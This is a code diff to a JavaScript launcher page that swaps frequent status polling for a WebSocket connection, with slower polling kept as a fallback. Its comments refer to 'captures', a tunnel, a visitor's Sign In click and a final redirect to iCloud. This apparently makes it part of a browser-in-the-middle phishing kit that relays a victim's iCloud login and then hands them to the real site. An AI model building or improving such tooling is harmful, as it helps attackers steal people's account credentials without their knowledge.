@@ -320,23 +320,130 @@
 
   begin();
 
-  function poll() {
-    fetch(named("/status"))
-      .then((r) => r.json())
-      .then((state) => {
-        if (state.page) target = state.page;
-        // Done is Sign In clicked. An error means the browser will not open;
-        // the capture is still the page the user came for, so show it.
-        if (state.status === "done" || state.status === "error") {
-          go();
-          return;
-        }
-        setTimeout(poll, 250);
-      })
-      .catch(() => setTimeout(poll, 800));
+  /* The line to the server.
+   *
+   * The launcher used to ask the server what was happening every quarter
+   * of a second: four requests a second, for as long as the browser took
+   * to open, through a tunnel that has to hold every one of them open -
+   * and the tunnel drops.
+   *
+   * So the launcher takes the line the captures already take. One socket,
+   * kept open, and the server says what is happening. The old way is still
+   * here, for when the line cannot be opened at all - and then it asks
+   * once a second, not four times.
+   */
+  function lineUrl() {
+    let scheme = "";
+    let host = "";
+    const base = serverBase();
+    if (base) {
+      const said = /^([a-z][a-z0-9+.-]*):\/\/([^/?#]+)/i.exec(base);
+      if (said) {
+        scheme = said[1].toLowerCase() === "https" ? "wss:" : "ws:";
+        host = said[2];
+      }
+    }
+    if (!scheme) {
+      // No address to go by: the page's own.
+      scheme = location.protocol === "https:" ? "wss:" : "ws:";
+      host = location.host;
+    }
+    return scheme + "//" + host + "/ws?visitor=" + encodeURIComponent(who);
   }
 
-  poll();
+  let line = false;          // the line to the server is up
+  let asking = 0;            // the timer of the old way of asking
+
+  function stopAsking() {
+    if (!asking) return;
+    clearTimeout(asking);
+    asking = 0;
+  }
+
+  function startAsking() {
+    if (asking || gone) return;
+    asking = setTimeout(function () {
+      asking = 0;
+      // The line came up in the meantime: the server is telling us.
+      if (line || gone) return;
+      fetch(named("/status"))
+        .then((r) => r.json())
+        .then((state) => {
+          if (state.page) target = state.page;
+          if (state.status === "done" || state.status === "error") {
+            go();
+            return;
+          }
+          startAsking();
+        })
+        .catch(() => startAsking());
+    }, 1000);
+  }
+
+  function listen() {
+    if (gone) return;
+    let socket;
+    try {
+      socket = new WebSocket(lineUrl());
+    } catch (err) {
+      setTimeout(listen, 1000);
+      return;
+    }
+
+    socket.onopen = function () {
+      line = true;
+      // The line is up: there is nothing to ask for.
+      stopAsking();
+    };
+
+    socket.onmessage = function (event) {
+      let message;
+      try {
+        message = JSON.parse(event.data);
+      } catch (err) {
+        return;
+      }
+      if (!message || typeof message.t !== "string") return;
+
+      if (message.t === "session") {
+        // What this visitor's browser is doing. The server says it, once.
+        if (message.page) target = message.page;
+        if (message.status === "done" || message.status === "error") go();
+        return;
+      }
+
+      if (message.t === "nav") {
+        // The capture has moved on, so the page the launcher is going to
+        // is the one the server says is on screen.
+        if (message.page) target = message.page;
+        return;
+      }
+
+      if (message.t === "finished") {
+        // The person is through: the app takes them to iCloud.
+        gone = true;
+        location.replace(message.page || "https://www.icloud.com/");
+      }
+    };
+
+    socket.onclose = function () {
+      line = false;
+      // The line is gone: ask the old way until it is back.
+      startAsking();
+      setTimeout(listen, 1000);
+    };
+
+    socket.onerror = function () {
+      try {
+        socket.close();
+      } catch (err) {
+        /* already closing */
+      }
+    };
+  }
+
+  listen();
+  startAsking();
 
   // No screen should be permanent. If the browser is still not up after half
   // a minute, open the capture anyway.
